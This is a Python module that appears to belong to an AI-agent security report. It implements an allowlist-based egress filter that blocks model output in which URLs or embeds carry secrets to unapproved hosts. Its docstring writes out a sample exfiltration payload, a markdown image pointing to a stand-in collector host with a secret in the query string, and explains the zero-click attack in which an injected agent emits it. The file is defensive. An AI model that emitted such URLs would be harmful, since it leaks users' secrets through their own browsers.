"""Egress filtering: what may leave, and by which channels.

The second structural defence. Where the broker governs *actions*, this
governs *bytes crossing the boundary* -- and the boundary is wider than it
looks, which is the point of the module.

A chat agent's output looks inert. It is not. If the surface renders markdown,
every image reference is an outbound HTTP GET to a URL the model chose, made by
the user's browser, with the user's network position. An attacker who cannot
make the agent call a tool can still make it emit

    ![](https://collect.example.net/p.png?d=<secret>)

and the exfiltration is performed by the victim's own client. No tool was
called. The broker never sees it. This is the attack that most "we sandboxed
the tools" architectures are still open to, and it is the reason egress is a
separate layer rather than part of the broker.
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field

MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*([^)\s]+)")
MARKDOWN_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*([^)\s]+)")
BARE_URL = re.compile(r"https?://[^\s<>\"')\]]+")
HTML_SRC = re.compile(r"<(?:img|script|iframe|audio|video|embed)[^>]*?"
                      r"(?:src|href)\s*=\s*[\"']([^\"']+)", re.IGNORECASE)


@dataclass(frozen=True)
class Finding:
    kind: str
    url: str
    detail: str
    auto_fetch: bool
    """Whether the rendering surface fetches this without a user click.

    The distinction decides severity and it is the one thing about egress the
    report insists on: a *link* requires a human to fall for it, an *image*
    requires nothing at all. Treating them alike either over-blocks ordinary
    prose or under-blocks the only zero-click channel in the output."""


@dataclass
class EgressVerdict:
    allowed: bool
    findings: tuple[Finding, ...] = ()
    redacted: str = ""
    rule: str = "allow"

    @property
    def zero_click(self) -> tuple[Finding, ...]:
        return tuple(f for f in self.findings if f.auto_fetch)


class EgressFilter:
    """Inspect model output for data leaving on an unapproved channel.

    Configured with an allowlist of hosts rather than a blocklist of patterns.
    This is not a stylistic preference. A blocklist enumerates the attacker's
    options and is therefore always incomplete; an allowlist enumerates the
    defender's, which is a finite set the defender already knows. The report
    measures what the allowlist costs on the benign corpus, where legitimate
    partner links do get blocked, and that cost is real and is reported rather
    than tuned away.
    """

    def __init__(self, allowed_hosts: frozenset[str] = frozenset(),
                 secrets: frozenset[str] = frozenset(),
                 *, allow_links_to_unknown_hosts: bool = True) -> None:
        self._allowed = allowed_hosts
        self._secrets = frozenset(s for s in secrets if s)
        self._allow_links = allow_links_to_unknown_hosts

    def _host(self, url: str) -> str:
        try:
            parsed = urllib.parse.urlparse(url)
        except ValueError:
            return ""
        return (parsed.hostname or "").lower()

    def _host_allowed(self, host: str) -> bool:
        if not host:
            return False
        if host in self._allowed:
            return True
        # Subdomain match, anchored on a dot so that "evilexample.net" does
        # not match an allowlist entry of "example.net". Anchoring is the
        # difference between an allowlist and a substring search, and getting
        # it wrong is a classic.
        return any(host.endswith("." + allowed) for allowed in self._allowed)

    def _leaked_secret(self, url: str) -> str | None:
        decoded = urllib.parse.unquote(url)
        for secret in self._secrets:
            if secret in url or secret in decoded:
                return secret
        return None

    def inspect(self, text: str) -> EgressVerdict:
        findings: list[Finding] = []

        def consider(url: str, kind: str, auto_fetch: bool) -> None:
            host = self._host(url)
            secret = self._leaked_secret(url)
            if secret:
                findings.append(Finding(
                    kind, url,
                    f"carries a known secret value in the {kind} target",
                    auto_fetch))
                return
            if self._host_allowed(host):
                return
            if not auto_fetch and self._allow_links:
                return
            findings.append(Finding(
                kind, url, f"host {host or '(unparseable)'} is not on the "
                           f"egress allowlist", auto_fetch))

        for url in MARKDOWN_IMAGE.findall(text):
            consider(url, "markdown-image", True)
        for url in HTML_SRC.findall(text):
            consider(url, "html-embed", True)
        for url in MARKDOWN_LINK.findall(text):
            consider(url, "markdown-link", False)

        # Bare URLs already captured inside markdown constructs are skipped so
        # a single leak is not counted twice; double counting would inflate
        # every per-finding rate in the report.
        seen = {f.url for f in findings}
        for url in BARE_URL.findall(text):
            if url not in seen and not any(url in f.url for f in findings):
                consider(url, "bare-url", False)

        # A secret appearing in plain prose is a leak even with no URL: the
        # user reads it, and the user may be the attacker.
        for secret in self._secrets:
            if secret in text and not any(secret in f.url for f in findings):
                findings.append(Finding(
                    "plaintext", "", "secret value present in the response body",
                    False))

        if not findings:
            return EgressVerdict(allowed=True, redacted=text)

        rule = ("secret-in-output"
                if any(f.kind == "plaintext" or "secret" in f.detail
                       for f in findings)
                else "unapproved-egress-host")
        return EgressVerdict(allowed=False, findings=tuple(findings),
                             redacted=self.redact(text, findings), rule=rule)

    def redact(self, text: str, findings: tuple[Finding, ...] | list[Finding]) -> str:
        out = text
        for finding in findings:
            if finding.url:
                out = out.replace(finding.url, "[blocked-url]")
        for secret in self._secrets:
            out = out.replace(secret, "[redacted]")
        return out


@dataclass
class EgressLog:
    verdicts: list[EgressVerdict] = field(default_factory=list)

    def record(self, verdict: EgressVerdict) -> None:
        self.verdicts.append(verdict)

    @property
    def blocked(self) -> int:
        return sum(1 for v in self.verdicts if not v.allowed)


def default_filter(secrets: frozenset[str] = frozenset(),
                   *, strict: bool = False) -> EgressFilter:
    """The filter used throughout the report.

    ``strict`` is the knob the report sweeps. Permissive mode lets links to
    unknown hosts through, which is necessary because ordinary correspondence
    is full of them -- and which leaves a working exfiltration channel, since
    the URL *path* can carry the payload and the recipient may click. Strict
    mode closes that channel and blocks legitimate mail. Neither setting is
    correct; the report presents both ends and the frontier between them.
    """
    return EgressFilter(
        allowed_hosts=frozenset({"partner.example", "reports.partner.example",
                                 "cdn.partner.example", "internal.example"}),
        secrets=secrets,
        allow_links_to_unknown_hosts=not strict)
